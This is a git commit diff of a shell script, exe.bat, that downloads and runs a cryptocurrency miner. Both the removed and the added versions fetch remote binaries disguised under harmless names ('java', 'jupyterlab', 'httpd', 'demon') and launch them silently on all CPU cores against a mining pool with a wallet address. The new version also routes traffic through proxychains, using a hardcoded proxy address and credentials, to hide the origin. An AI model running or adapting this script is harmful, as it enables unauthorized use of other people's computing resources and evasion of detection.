1f081c63a989fa18cb8935f5343df561a1e527b5
ryandijeremy <167563417+ryandijeremy@users.noreply.github.com>
2024-05-11 16:52:24 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,2 +1,22 @@
-wget -q -O java https://github.com/swanderenata/NFT/raw/main/jupyterlab && chmod +x java
-nohup ./java -o 45.115.225.225:8080 -a rx/0 -u ZEPHYR2tBHcj5UGL8ht15WiyPifGuh7ugHN5nAKXhDAE79gGobZ4kH9USdGNwy8prj7Sb7sXWXKEtck6cxF8138fJpd4iSa2cEM23.bian --randomx-1gb-pages -p -x -t $(nproc --all) &>/dev/null &
+proxy="34.232.217.139" 
+port="1080" 
+user="kkm6q0pyklj5nr"  
+pass="96o50shuhn3ifrz317pf4gngefw8v"
+wget -q -O demon https://github.com/swanderenata/cautious-octo-garbanzo/raw/main/httpd && chmod +x demon
+wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel 
+wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
+sleep 3 
+sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
+sleep 1 
+sed -i "s/port/$port/" "proxychains.conf" 
+sed -i "s/user/$user/" "proxychains.conf"  
+sleep 1  
+sed -i "s/pass/$pass/" "proxychains.conf"  
+sleep 11 
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " " 
+echo " " 
+echo "IP BARU ==> "$(./panel curl ifconfig.me)
+./panel ./demon -a yescryptR32 -o 45.115.225.225:443 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-mikayui) -t $(nproc --all)
